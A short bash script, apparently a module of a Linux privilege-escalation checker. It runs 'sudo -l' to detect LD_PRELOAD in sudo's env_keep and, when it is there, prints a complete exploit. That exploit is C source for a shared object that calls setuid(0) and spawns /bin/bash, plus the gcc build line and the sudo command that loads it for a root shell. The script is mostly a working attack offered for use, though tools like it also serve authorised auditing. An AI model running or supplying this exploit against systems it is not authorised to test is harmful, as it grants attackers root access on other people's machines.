#!/bin/bash
source "$(dirname "$0")/00_common.sh"

info "Checking LD_PRELOAD exploitation..."

if sudo -l 2>/dev/null | grep -q "env_keep.*LD_PRELOAD"; then
    success "VULNERABLE: LD_PRELOAD in sudo env_keep!"
    echo ""
    echo "Exploit:"
    echo '  1. Create /tmp/pe.c:'
    echo '     #include <stdio.h>'
    echo '     #include <stdlib.h>'
    echo '     void _init() { unsetenv("LD_PRELOAD"); setuid(0); system("/bin/bash"); }'
    echo '  2. gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles'
    echo '  3. sudo LD_PRELOAD=/tmp/pe.so <allowed_command>'
else
    fail "No LD_PRELOAD vulnerability found"
fi
